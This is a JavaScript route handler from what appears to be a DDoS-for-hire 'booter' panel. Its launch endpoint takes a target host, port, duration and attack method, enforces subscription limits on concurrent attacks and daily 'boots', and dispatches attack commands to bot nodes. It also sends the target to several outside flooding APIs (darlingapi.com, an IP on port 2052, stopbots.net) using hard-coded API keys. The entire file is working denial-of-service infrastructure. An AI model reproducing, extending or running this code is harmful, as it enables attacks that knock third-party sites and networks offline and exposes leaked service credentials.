const checkUser = require('../../functions/checkUser')
const formulatePayload = require('../../functions/formulatePayload')

const ongoingSchema = require('../../models/ongoing')
const logsSchema = require('../../models/logs')

const methodSchema = require('../../models/methods')

const yup = require('yup');

const axios = require('axios');

const generateString = require('../../functions/generateString')

const proxyConfig = require('../../proxy.json')

const {checkIP, checkPort, checkDomain} = require('../../functions/validator')

const proxyList = proxyConfig.proxy
const schema = yup.object().shape({
	Token: yup.string().length(64).required(),
	host: yup.string().min(1).max(255).required(),
	port: yup.number().positive().max(65535).default(80),
	time: yup.number().min(30).positive().required(),
	method: yup.string().length(16).required(),
	proxy : yup.number().default(0),
	postdata : yup.string(),
	headers : yup.string(),
	restOption : yup.string(),
	cookie: yup.string(),
	getquery: yup.string()
});

module.exports = (app, socket, broadcast) => {
	app.post('/panel/launch/:id', async (req, res, next) => {
		const {
			authorizationtoken: Token
		} = req.headers
		let {
			host,
			port,
			time,
			method,
			proxy,
			postdata,
			headers,
			restOption,
			cookie,
			getquery
		} = req.body;

		if (!checkIP(host) && !checkDomain(host)){
			return next(new Error('Invalid Host'))
		}

		try {
			await schema.validate({
				Token,
				host,
				port,
				time,
				method,
				proxy,
				postdata,
				headers,
				restOption,
				cookie,
				getquery
			})
			
			const userFound = await checkUser(Token, req.useragent)
			if(time > userFound.maxTime)
				return next(new Error('Maximum time limit exceeded.'))

			const methodFound = await methodSchema.findOne( { id : method } )
			if(!methodFound)
				return next(new Error('Invalid method.'))

			const currentConcurrent = await ongoingSchema.countDocuments({
				user : userFound.username,
				stopped : false
			})
			if (currentConcurrent >= userFound.concurrent)
				return next(new Error('Concurrent limit exceeded.'))

			// Check Total Boots of Today
			var start = new Date();
			start.setHours(0,0,0,0);

			var end = new Date();
			end.setHours(23,59,59,999);

			const currentBoots = await ongoingSchema.countDocuments({
				user : userFound.username,
				time : { 
					$gte: start, 
					$lt: end
				}
			})
			if(currentBoots >= userFound.maxBoots) 
				return next(new Error('Maximum Boots limit exceeded.'))
			
			let proxyUsed = ''
			let rest = 'get'
			if(methodFound.http) {
				proxyUsed = proxyList[proxy].file_http
				rest = restOption === 'get' ? 'get' : 'post'
			}
			else
				proxyUsed = proxyList[proxy].file
			let filename = 'nil'
			const sesId = generateString(32)
			if(methodFound.headers && headers) {
				filename = 'headers-' + sesId + '.txt'
				broadcast({
					nodes: methodFound.nodes,
					type : 'write-file',
					filename: filename,
					content: headers
				})
			}
			const data = {
				host,
				port,
				time,
				postdata,
				headers : filename,
				rest,
				proxyUsed,
				cookie,
				getquery
			}
			let payload = formulatePayload(methodFound.program, methodFound.args, data)
			payload = payload.replace(/([;:<>|"'&?=$`\\])/g,'\$1')
			const socketPayload = {
				session : sesId,
				type : 'attack',
				payload,
				time: time,
				nodes : methodFound.nodes
			}

			broadcast(socketPayload)
			const logAdded = new logsSchema()
			logAdded.id = generateString(32)
			logAdded.user = userFound.username
			logAdded.destination = host 
			logAdded.port = port
			logAdded.method = methodFound.title 
			logAdded.duration = time
			await logAdded.save()

			const ongoingAdded = new ongoingSchema()
			ongoingAdded.id = sesId
			ongoingAdded.user = userFound.username
			ongoingAdded.destination = host 
			ongoingAdded.method = methodFound.title 
			ongoingAdded.port = port
			ongoingAdded.duration = time
			ongoingAdded.stopped = false
			ongoingAdded.nodes = methodFound.nodes
			ongoingAdded.time = new Date()
			await ongoingAdded.save()

		 	res.send({
		 		success : true,
		 		message : 'Success.'
		 	})

		 	let timeOutduration = time * 1000

		 	// LAYER 7 API CALL
		 	if(methodFound.layer === 7 || methodFound.layer === 70) {
				try {
					axios.get('https://darlingapi.com/', {
						params: {
							key: '3926b1330990342e05f9f1b9-6d5001ea',
							host: host,
							port: port ? port : 80,
							time: userFound.admin ? time : 100,
							method: 'TLSv1'
						}
					})
				} catch (err) {
					console.log('darlingapi.com API error')
				}
				try {
					axios.get('http://51.79.249.191:2052/attack', {
						params: {
							key: 'fuckingtired',
							target: host,
							port: port ? port : 80,
							duration: time,
							method: 'UAM-GET'
						}
					})
				} catch (err) {
					console.log('51.79.249.191:2052 API error')
				}
				try {
					axios.get('https://stopbots.net/l7_secret_folder_123', {
						params: {
							key: 'gerrgtyowtfmayowtfman2yowtfman2yowtfman2n2rtghrt',
							target: host,
							port: port ? port : 80,
							time: time,
							method: 'cf',
							servers: 'bvultr'
						}
					})
				} catch (err) {
					console.log('Stopbots.net API error')
				}
				
		 	}
		 	// LAYER 4 API CALLS
			if(userFound.subbed && methodFound.layer === 4) {
				try {
					axios.get('https://darlingapi.com/', {
						params: {
							key: '3b3ef3095c332dd3762f1908-2ce7e6ee',
							host: host,
							port: port ? port : 80,
							time: userFound.admin ? time : 800,
							method: methodFound.title
						}
					})
				} catch (err) {
					console.log('darlingapi.com API error')
				}
			}

		 	setTimeout( async () => {
		 		const stopPayload = {
					session : sesId,
					type : 'stop',
					nodes : methodFound.nodes
				}

				broadcast(stopPayload)
				ongoingAdded.stopped = true
				await ongoingAdded.save()

				if(methodFound.headers && headers) {
					broadcast({
						nodes: methodFound.nodes,
						type : 'remove-file',
						filename: filename
					})
				}
				return
		 	}, timeOutduration + 500)
		} catch (err)
		{
			return next(err)
		}
	})
}
